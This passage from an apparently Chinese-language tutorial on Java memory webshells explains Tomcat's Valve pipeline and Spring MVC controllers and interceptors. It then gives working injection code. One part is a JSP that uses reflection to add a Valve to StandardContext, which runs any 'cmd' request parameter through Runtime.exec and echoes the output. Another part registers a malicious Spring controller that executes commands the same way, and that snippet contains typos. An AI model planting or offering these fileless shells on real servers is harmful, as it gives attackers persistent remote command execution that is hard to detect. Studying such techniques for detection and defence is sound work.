</span></span></span></code></pre></div><h3 id=14-valve>1.4 Valve</h3><h4 id=1-valve>1) Valve</h4><p><code>Valve</code> 是一种可以插入到请求处理管道中的组件，每个 <code>Valve</code>都可以在请求到达最终的目标资源之前或之后执行特定的操作。Tomcat 使用一种称为“管道-阀门模式”的设计模式来组织这些 <code>Valves</code>。在这种模式下，多个 <code>Valves</code> 可以被串联在一起形成一个链条，每个 Valve 都有机会处理请求，并决定是否将请求传递给下一个 Valve 或直接终止处理过程。</p><p>在Tomcat中，四大组件 <code>Engine</code>、<code>Host</code>、<code>Context</code>以及 <code>Wrapper</code>都有其对应的 <code>Valve</code>类——<code>StandardEngineValve</code>、<code>StandardHostValve</code>、<code>StandardContextValve</code>以及 <code>StandardWrapperValve</code>。它们共同维护一个 <code>StandardPipeline</code>实例。</p><p>作为 <code>Pipeline</code>接口的默认实现类，<code>StandardPipeline</code>类实现了 <code>Pipeline</code>接口的 <code>addValve()</code>方法，通过该方法可以实现动态新增 <code>Valve</code>对象。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>interface</span> <span class=nc>Pipeline</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>Contained</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>   </span><span class=n>Valve</span><span class=w> </span><span class=nf>getBasic</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>   </span><span class=kt>void</span><span class=w> </span><span class=nf>setBasic</span><span class=p>(</span><span class=n>Valve</span><span class=w> </span><span class=n>var1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>   </span><span class=kt>void</span><span class=w> </span><span class=nf>addValve</span><span class=p>(</span><span class=n>Valve</span><span class=w> </span><span class=n>var1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>   </span><span class=n>Valve</span><span class=o>[]</span><span class=w> </span><span class=nf>getValves</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>   </span><span class=kt>void</span><span class=w> </span><span class=nf>removeValve</span><span class=p>(</span><span class=n>Valve</span><span class=w> </span><span class=n>var1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>   </span><span class=n>Valve</span><span class=w> </span><span class=nf>getFirst</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>   </span><span class=kt>boolean</span><span class=w> </span><span class=nf>isAsyncSupported</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>   </span><span class=kt>void</span><span class=w> </span><span class=nf>findNonAsyncValves</span><span class=p>(</span><span class=n>Set</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>var1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p><code>Valve</code>接口包含一个 <code>invoke()</code>方法，该方法接收 <code>Request</code>和 <code>Response</code>对象作为参数。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.apache.catalina</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>jakarta.servlet.ServletException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.catalina.connector.Request</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.catalina.connector.Response</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>interface</span> <span class=nc>Valve</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>   </span><span class=n>Valve</span><span class=w> </span><span class=nf>getNext</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>   </span><span class=kt>void</span><span class=w> </span><span class=nf>setNext</span><span class=p>(</span><span class=n>Valve</span><span class=w> </span><span class=n>var1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>   </span><span class=kt>void</span><span class=w> </span><span class=nf>backgroundProcess</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>   </span><span class=kt>void</span><span class=w> </span><span class=nf>invoke</span><span class=p>(</span><span class=n>Request</span><span class=w> </span><span class=n>var1</span><span class=p>,</span><span class=w> </span><span class=n>Response</span><span class=w> </span><span class=n>var2</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ServletException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>   </span><span class=kt>boolean</span><span class=w> </span><span class=nf>isAsyncSupported</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h4 id=2-valve-内存马>2) Valve 内存马</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.valves.ValveBase&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.StandardContext&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.connector.Request&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.connector.Response&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.IOException&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.lang.reflect.Field&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.Pipeline&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.InputStreamReader&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.BufferedReader&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>    </span><span class=kd>class</span> <span class=nc>DynamicValveShell</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>ValveBase</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>        </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>invoke</span><span class=p>(</span><span class=n>Request</span><span class=w> </span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=n>Response</span><span class=w> </span><span class=n>resp</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ServletException</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>        </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>            </span><span class=n>resp</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;&lt;br&gt;Hello Dynamic Valve Shell&lt;br&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>                </span><span class=n>resp</span><span class=p>.</span><span class=na>setContentType</span><span class=p>(</span><span class=s>&#34;text/html&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>                </span><span class=n>Process</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>                </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w>                </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w>                    </span><span class=n>resp</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>29</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;request&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>33</span><span class=cl><span class=w>    </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>34</span><span class=cl><span class=w>    </span><span class=n>Request</span><span class=w> </span><span class=n>req</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Request</span><span class=p>)</span><span class=w> </span><span class=n>f</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>request</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>36</span><span class=cl><span class=w>    </span><span class=n>StandardContext</span><span class=w> </span><span class=n>standardContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>StandardContext</span><span class=p>)</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getContext</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>37</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>38</span><span class=cl><span class=w>    </span><span class=n>Pipeline</span><span class=w> </span><span class=n>pipeline</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>standardContext</span><span class=p>.</span><span class=na>getPipeline</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>39</span><span class=cl><span class=w>    </span><span class=n>DynamicValveShell</span><span class=w> </span><span class=n>valve</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>DynamicValveShell</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>40</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>41</span><span class=cl><span class=w>    </span><span class=n>pipeline</span><span class=p>.</span><span class=na>addValve</span><span class=p>(</span><span class=n>valve</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>42</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>43</span><span class=cl><span class=w></span><span class=o>%&gt;</span><span class=w>
</span></span></span></code></pre></div><h3 id=15-spring-mvc>1.5 Spring MVC</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>MVC —— Model-View-Controller
</span></span></code></pre></td></tr></table></div></div><h4 id=1-controller>1) Controller</h4><p><code>Controller</code> 是 <code>Spring MVC</code>中的核心组件，用于处理用户请求并返回响应。<code>Controller</code>与 <code>Servlet</code>的区别在于前者更专注于业务逻辑的处理，并不直接处理 <code>Request</code>和 <code>Response</code>。</p><p>简单理解，<code>Spring MVC</code>中的 <code>Controller</code>更在 <code>Servlet</code>之后，它通过核心 <code>Servlet</code>实例 <code>DispatchServlet</code>接收所有请求，然后把这些请求分发给不同的 <code>Controller</code>进行处理，<code>Controller</code>处理完毕之后返回一个 <code>ModelAndViewer</code>，<code>DispatchServlet</code>再把 <code>ModelAndViewer</code>转换为 <code>Response</code>，然后返回给用户。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// Controller 示例</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=nd>@RestController</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=s>&#34;/api&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>ApiController</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>    </span><span class=nd>@Autowired</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>    </span><span class=n>UserService</span><span class=w> </span><span class=n>userService</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>(</span><span class=s>&#34;/profile&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>User</span><span class=o>&gt;</span><span class=w> </span><span class=nf>getUsers</span><span class=p>(){</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>userService</span><span class=p>.</span><span class=na>getUsers</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>(</span><span class=s>&#34;/profile/{id}&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>User</span><span class=w> </span><span class=nf>getUser</span><span class=p>(</span><span class=nd>@PathVariable</span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>)</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>id</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>userService</span><span class=p>.</span><span class=na>getUserById</span><span class=p>(</span><span class=n>id</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>与 <code>Servlet</code>，<code>Filter</code>，<code>Listener</code>由Servlet容器管理不同，每个 <code>Controller</code>都是一个 <code>Bean</code>，由Spring的 <code>IOC容器</code>管理。所以要动态注入 <code>Controller</code>，需要获取Spring容器的 <code>ApplicationContext</code>，而不是Servlet容器的 <code>StandardContext</code>。</p><h5 id=-获取-applicationcontext>Ⅰ. 获取 ApplicationContext</h5><p>&mldr;&mldr;</p><h5 id=-注册恶意-controller>Ⅱ. 注册恶意 Controller</h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=c1>// 假设已经获取了 ApplicationContext</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=c1>// 通过 ApplicationContext 获取 RequestMappingHandlerMapping 实例</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=n>RequestMappingHandlerMapping</span><span class=w> </span><span class=n>rmhm</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>context</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=n>RequestMappingHandlerMapping</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=c1>// 通过获取 ControllerShell 类的 shell 方法</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ControllerShell</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;shell&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=c1>// 设置路径和请求方法</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w></span><span class=n>PatternRequestCondidtion</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PatternRequestCondition</span><span class=p>(</span><span class=s>&#34;/ControllerShell&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=n>RequestMethodsRequestCondition</span><span class=w> </span><span class=n>methodCondition</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RequestMethodsRequestCondition</span><span class=p>(</span><span class=n>RequestMethod</span><span class=p>.</span><span class=na>GET</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w></span><span class=c1>// 注入 Controller</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w></span><span class=n>RequestMappingInfo</span><span class=w> </span><span class=n>info</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RequestMappingInfo</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=w> </span><span class=n>methodCondition</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w></span><span class=n>rmhm</span><span class=p>.</span><span class=na>registerMapping</span><span class=p>(</span><span class=n>info</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;ControllerShell&#34;</span><span class=p>).</span><span class=na>newInstance</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w></span><span class=c1>// 恶意 Controller</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w></span><span class=kd>class</span> <span class=nc>ControllerShell</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>shell</span><span class=p>(){</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>        </span><span class=c1>//获取request</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>        </span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>((</span><span class=n>ServletRequestAttributes</span><span class=p>)</span><span class=w> </span><span class=p>(</span><span class=n>RequestContextHolder</span><span class=p>.</span><span class=na>currentRequestAttributes</span><span class=p>())).</span><span class=na>getRequest</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>        </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h4 id=2-interceptor>2) Interceptor</h4><p><code>Interceptor</code> 是Spring MVC中类似于 <code>Filter</code>的一种组件，可以拦截所有请求，通常用于权限校验，统一输出，记录日志等。</p><p><code>Interceptor</code> 必须实现 <code>HandlerInterceptor</code> 接口，可以选择重写 <code>preHandle()</code>，<code>postHandle()</code>和 <code>afterCompletion()</code>三个方法。上述三个方法分别在Controller方法调用前、Controller方法正常执行后以及Controller方法无论是否正常执行时执行。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.springframework.web.servlet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>jakarta.servlet.http.HttpServletRequest</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>jakarta.servlet.http.HttpServletResponse</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.lang.Nullable</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>interface</span> <span class=nc>HandlerInterceptor</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>   </span><span class=k>default</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>preHandle</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>      </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>  </span><span class=c1>// 返回false时，不会执行下一个拦截器，也不会执行controller方法</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>   </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>   </span><span class=k>default</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>postHandle</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>handler</span><span class=p>,</span><span class=w> </span><span class=nd>@Nullable</span><span class=w> </span><span class=n>ModelAndView</span><span class=w> </span><span class=n>modelAndView</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>   </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>
